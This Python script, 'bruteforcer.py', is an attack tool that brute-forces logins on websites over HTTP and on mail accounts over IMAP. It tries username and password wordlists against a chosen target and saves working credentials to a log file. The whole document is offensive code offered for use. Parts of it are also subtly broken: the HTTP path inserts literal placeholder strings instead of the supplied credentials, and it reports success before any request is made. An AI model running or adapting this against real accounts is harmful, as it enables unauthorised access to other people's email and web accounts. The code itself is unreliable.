#!/usr/bin/env python3

import argparse
import requests
import imaplib

def banner():
    print("""
        ███████████                        █████               
       ░░███░░░░░███                      ░░███                
        ░███    ░███ ████████  █████ ████ ███████    ██████    
        ░██████████ ░░███░░███░░███ ░███ ░░░███░    ███░░███   
        ░███░░░░░███ ░███ ░░░  ░███ ░███   ░███    ░███████    
        ░███    ░███ ░███      ░███ ░███   ░███ ███░███░░░     
        ███████████  █████     ░░████████  ░░█████ ░░██████    
       ░░░░░░░░░░░  ░░░░░       ░░░░░░░░    ░░░░░   ░░░░░░     
                                                               
     ███████████                                               
    ░░███░░░░░░█                                               
     ░███   █ ░   ██████  ████████   ██████   ██████  ████████ 
     ░███████    ███░░███░░███░░███ ███░░███ ███░░███░░███░░███
     ░███░░░█   ░███ ░███ ░███ ░░░ ░███ ░░░ ░███████  ░███ ░░░ 
     ░███  ░    ░███ ░███ ░███     ░███  ███░███░░░   ░███     
     █████      ░░██████  █████    ░░██████ ░░██████  █████    
    ░░░░░        ░░░░░░  ░░░░░      ░░░░░░   ░░░░░░  ░░░░░     
    """)


def arg_parsing():
    try:

        parser = argparse.ArgumentParser(prog="bruteforcer.py", description="A program to bruteforce webpages using HTTP or IMAP", usage="%(prog)s --help")

        parser.add_argument("-Hm",  "--http-method",   dest="http",         help="Set GET or POST HTTP attack method",  nargs=1,  type=str,  choices=['GET', 'POST', 'OPTIONS', 'HEAD', 'POST', 'PUT'])
        parser.add_argument("-Hp",  "--http-params",   dest="http_params",  help="Set the URL parameter targets",       nargs=1,  type=str)
        parser.add_argument("-Hb",  "--http-body",     dest="http_body",    help="Set the HTTP body parameter targets", nargs=1,  type=str)
        parser.add_argument("-Im",  "--imap",          dest="imap",         help="Set server address for IMAP method",  nargs=1,  type=str)
        parser.add_argument("-d",   "--domain",        dest="url",          help="Set the website or domain to attack", nargs=1,  type=str)
        parser.add_argument("-u",   "--user",          dest="user",         help="Use a single username",               nargs=1,  type=str)
        parser.add_argument("-Ul",  "--user_list",     dest="user_list",    help="Use a username wordlist",             nargs=1,  type=str)
        parser.add_argument("-pw",  "--password",      dest="passwd",       help="Use a single password",               nargs=1,  type=str)
        parser.add_argument("-Pl",  "--passwd_list",   dest="passwd_list",  help="Use a password wordlist",             nargs=1,  type=str)
        
        return parser.parse_args()

    except Exception as error:
        print(error)


## Error Handling Related Code [Start]
def error_handler(opts):

    # Checking if required arguments are present
    if not opts.http and not opts.imap:
        print("Missing arguments:")
        print("Please select either the HTTP attack [-H] or the IMAP attack [-Im]")
        print("To see more options, use [--help]")
        exit(1)

    if opts.http and not opts.url:
        print("Missing target URL:")
        print("For the HTTP attack method [-H], the URL [-d] of a website is required.")
        print("For this method, the URL can also be followed by a port number. Ex: 'https://example.com:8000'")
        print("To see more options, use [--help]")
        exit(1)

    if opts.http and not opts.http_body and not opts.http_params:
        print("Missing payload vector:")
        print("For the HTTP attack method [-H], choose the request parameters [-Hp] or body [-Hb] as the payload vector.")
        print("Please add the proper username and password parameters [Ex: 'user=$USER&pwd=$PWD'].")
        print("To see more options, use [--help]")
        exit(1)

    if opts.imap and not opts.url:
        print("Missing arguments:")
        print("For the IMAP attack [-Im], the domain [-d] of an email address is required.")
        print("Ex: 'email.com', for 'user@email.com'")
        print("To see more options, use [--help]")
        exit(1)

    # Checking if usernames are missing
    if not opts.user and not opts.user_list:
        print("Missing arguments:")
        print("No username [-u] or wordlist [-U] was passed")
        exit(1)

    # Checking if passwords are missing
    if not opts.passwd and not opts.passwd_list:
        print("Missing arguments:")
        print("No password [-p] or wordlist [-P] was passed")
        exit(1)

    # Checking argument conflicts
    if opts.http and opts.imap:
        print("Conflicting arguments:")
        print("Please use either the HTTP attack [-H] or the IMAP attack [-Im]")
        exit(1)

    if opts.user and opts.user_list:
        print("Conflicting arguments:")
        print("Please use either a single username [-u] or a username list [-U]")
        exit(1)
            
    if opts.passwd and opts.passwd_list:
        print("Conflicting arguments:")
        print("Please use either a single password [-p] or a password list [-P]")
        exit(1)
## Error Handling Related Code [End]


### I/O File Handling Related Code [Start]
def get_wordlist(filename):
    try:

        with open(filename, "r") as file:
            wordlist = []

            for line in file:
                line = line.replace("\n", "")
                wordlist.append(line)

        return wordlist

    except Exception as error:
        print("FILE_CHOOSER ERROR: ", error)


def write_credentials(user, passwd):
    try:

        with open("credentials.log", "w") as credentials:
            credentials.write(f"{user}:{passwd}\n")

    except Exception as error:
        print("Error Writing Credentials to File: ", error)
### I/O File Handling Related Code [End]


### Request Related Code [Start]
def http_request(args, user, passwd):
    request = args['request']
    url = args['url']

    parameters = request['params']   
    body = request['body']
    
    if parameters != '':
        parameters = parameters.replace('$USER', 'user')
        parameters = parameters.replace('$PWD', 'passwd')
    else:
        body = body.replace('$USER', 'user')
        body = body.replace('$PWD', 'passwd')

    print(f"[SUCCESS] -> {request['method']} {url}?{parameters}\n{body}\n")

    try:
        response = requests.Session()
        response = requests.request(request['method'], url, params=parameters, data=body)
        response.raise_for_status()
        print(response.status_code)
        print(response)
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:", errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:", errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:", errt)
    except requests.exceptions.RequestException as err:
        print ("Oops: Something Else", err)


def imap_request(args, user, passwd):
    print(args, user, passwd)
    email = user + "@" + args['domain']
    
    try:
        imap = imaplib.IMAP4_SSL(args['server'])
        imap.login(email, passwd)

        write_credentials(user, passwd)
        print(f"[SUCCESS] -> {user}:{passwd}")

        imap.logout()
        return True

    except Exception as error:
        print("Invalid Login.")
        return False
### Request Related Code [End]


def generate_payload(opts):
    ## Prepare Payload & Arguments
    url = opts.url[0]

    # HTTP attack
    if opts.http:
        request = {'method': opts.http[0]}
        
        if not url.startswith('https://') and not url.startswith('http://'):
            url = 'http://' + url

        if opts.http_params:
            request['params'] = opts.http_params[0]
        else:
            request['params'] = ''
        
        if opts.http_body:
            request['body'] = opts.http_body[0]
        else:
            request['body'] = ''
        
        attack = {'function': http_request}
        args = {'request': request, 'url': url}

    #IMAP attack
    elif opts.imap:
        if '@' in url:
            url = url.rsplit('@',1)[1].strip()

        attack = {'function': imap_request}
        args = {'server': opts.imap[0], 'domain': url}

    payload = {'attack': attack, 'args': args}

    return(payload)


## Main Orchestrator [Start]
def manager(opts, payload):

    attack = payload['attack']
    args = payload['args']

    ## User and Password Processing
    if opts.user_list:
        usernames = get_wordlist(opts.user_list[0])
    else:
        user = opts.user[0]
        
    if opts.passwd_list:
        passwords = get_wordlist(opts.passwd_list[0])
    else:
        passwd = opts.passwd[0]

    try:

        # [-UP] User and Password Wordlist
        if opts.user_list and opts.passwd_list:
            for user in usernames:
                for passwd in passwords:
                    attack['function'](args, user, passwd)

        # [-uP] One User and Password Wordlist
        elif opts.user and opts.passwd_list:
            for passwd in passwords:
                attack['function'](args, user, passwd)

        # [-Up] User Wordlist with One Password
        elif opts.user_list and opts.passwd:
            for user in usernames:
                attack['function'](args, user, passwd)

        # [-up] One User and One Password
        elif opts.user and opts.passwd:
            attack['function'](args, user, passwd)

    except Exception as error:
        print("! ERROR IN: manager() !")
        print(error.args())
## Main Orchestrator [End]


# Main [Start]
def main():
    banner()

    opts = arg_parsing()
    error_handler(opts)

    payload = generate_payload(opts)
    manager(opts, payload)


if __name__ == '__main__':
    main()
# Main [End]

